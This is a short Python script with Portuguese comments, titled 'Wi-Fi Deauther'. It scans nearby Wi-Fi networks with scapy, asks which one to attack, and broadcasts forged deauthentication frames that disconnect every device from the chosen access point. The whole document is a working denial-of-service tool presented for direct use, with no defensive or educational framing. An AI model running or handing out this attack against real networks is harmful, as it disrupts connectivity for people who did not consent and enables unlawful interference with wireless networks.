
# Wi-Fi Deauther

# Importando as Bibliotecas
from scapy.all import *
import os

from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11Beacon, Dot11Deauth


# Função para obter todas as redes
def get_wifi_networks(interface="wlan0mon"):
    networks = []
    scan_result = []

    try:
        scan_result = sniff(iface=interface,timeout=10, prn=lambda x: x.summary())
    except KeyboardInterrupt:
        pass

    # Extrair o ESSID e BSSID do pacote de beacon
    for packet in scan_result:
        if packet.haslayer(Dot11Beacon):
            essid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr3

            if essid not in [net[0] for net in networks]:
                networks.append((essid, bssid))
    return networks

# Função enviar pacotes deauth (desconectar os dispositivos da rede)
def deauth_all_devices(target_bssid, iface="wlan0mon"):
    deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff",
                                       addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()

    sendp(deauth_packet, iface=iface, count=100, inter=0.1)

# Função da scan das redes Wi-Fi
if __name__ == '__main__':
    print("Escaneando redes Wi-Fi ao redor...")
    wifi_networks = get_wifi_networks()

    if wifi_networks:
        os.system('clear')
        print("Redes Wi-Fi encontradas:")
        for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
            print(f"{idx}. ESSID: {essid}:, BSSID: {bssid}")

    # Escolhendo rede alvo para o ataque
    selected_option = int(input("ID da rede para atacar: "))
    if 1 <= selected_option <= len(wifi_networks):
        selected_bssid = wifi_networks[selected_option - 1][1]
        print(f"Realizando o deauth na rede com BSSID: {selected_bssid}")
        deauth_all_devices(selected_bssid)
        print(f"Deauth enviado para todos os dispositivos na rede.")
    else:
        print("Opção inválida.")

else:
    print("Nenhuma rede Wi-Fi encontrada durante o scan.")
